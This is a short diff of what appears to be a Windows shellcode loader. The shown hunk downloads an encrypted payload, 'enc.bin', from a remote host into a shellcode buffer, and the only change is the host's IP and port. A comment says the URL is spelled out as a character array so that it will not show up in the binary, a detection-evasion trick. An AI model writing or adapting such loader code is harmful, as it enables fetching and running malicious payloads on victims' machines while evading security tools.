@@ -108,7 +108,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
     /// Download payload 
     // Define the url as an array of characters, in order to not have it show up in the binary
-    wchar_t szUrl[] = { 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', '0', '8', '/', 'e', 'n', 'c', '.', 'b', 'i', 'n', '\0' };
+    wchar_t szUrl[] = { 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '8', '1', '.', '2', '3', '0', ':', '8', '0', '0', '0', '/', 'e', 'n', 'c', '.', 'b', 'i', 'n', '\0' };
 
     if (!Download(szUrl, &pShellcode, &sSize)) {
         PRINT_ERROR("Download"); 
